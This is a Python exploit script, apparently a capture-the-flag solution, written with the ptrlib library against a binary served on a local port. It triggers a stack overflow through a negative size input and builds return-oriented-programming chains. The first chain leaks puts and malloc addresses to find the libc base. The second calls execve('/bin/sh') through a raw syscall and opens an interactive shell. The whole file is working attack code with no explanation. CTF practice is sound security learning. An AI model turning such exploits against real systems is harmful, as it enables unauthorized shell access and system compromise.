from ptrlib import *

elf = ELF("./challenge")
libc = ELF("./libc6_2.27-3ubuntu1_amd64.so")
#sock = Process("./challenge")
sock = Socket("127.0.0.1", 4001)
#sock = Socket("192.168.1.19", 4002)

addr_start = elf.symbol("_start")
plt_puts = 0x4006b8
got_puts = elf.got("puts")
got_malloc = elf.got("malloc")
rop_pop_rdi = 0x00400a43
rop_pop_r15 = 0x00400a42

def write_addr(addr):
    global cnt
    sock.sendline(str(addr & 0xFFFFFFFF))
    sock.sendline(str(addr >> 32))
    cnt += 2

## round 1
sock.recvline()
sock.sendline("y")
sock.recvuntil("name: ")
sock.sendline("ptr-yudai")
sock.recvline()

# Stack Overflow
sock.sendline("-128")
cnt = 0
for i in range(20):
    sock.sendline("0")
    cnt += 1
for i in range(6):
    sock.sendline("+")
    cnt += 1

# leak <puts>
write_addr(rop_pop_rdi)
write_addr(got_puts)
write_addr(plt_puts)
# leak <malloc>
write_addr(rop_pop_rdi)
write_addr(got_malloc)
write_addr(plt_puts)
# call _start
write_addr(addr_start)
for i in range(0x80 - cnt):
    sock.sendline("+")
sock.recvline()

addr1 = u64(sock.recvline().strip())
addr2 = u64(sock.recvline().strip())
libc_base = addr1 - libc.symbol("puts")
addr_system = libc_base + libc.symbol("system")
addr_binsh = libc_base + next(libc.find("/bin/sh"))
dump("libc base = " + hex(libc_base))

## round 2
sock.recvline()
sock.sendline("y")
sock.recvuntil("name: ")
sock.sendline("ptr-yudai")
sock.recvline()

# Stack Overflow
sock.sendline("-128")
cnt = 0
for i in range(20):
    sock.sendline("0")
    cnt += 1
for i in range(6):
    sock.sendline("+")
    cnt += 1

rop_pop_rax = libc_base + 0x000439c7
rop_pop_rsi = libc_base + 0x00023e6a
rop_pop_rdx = libc_base + 0x00001b96
rop_syscall = libc_base + 0x000013c0

# call system("/bin/sh")
write_addr(rop_pop_rdi)
write_addr(addr_binsh)
write_addr(rop_pop_rsi)
write_addr(0)
write_addr(rop_pop_rdx)
write_addr(0)
write_addr(rop_pop_rax)
write_addr(59)
write_addr(rop_syscall)

for i in range(0x80 - cnt):
    sock.sendline("+")

sock.interactive()
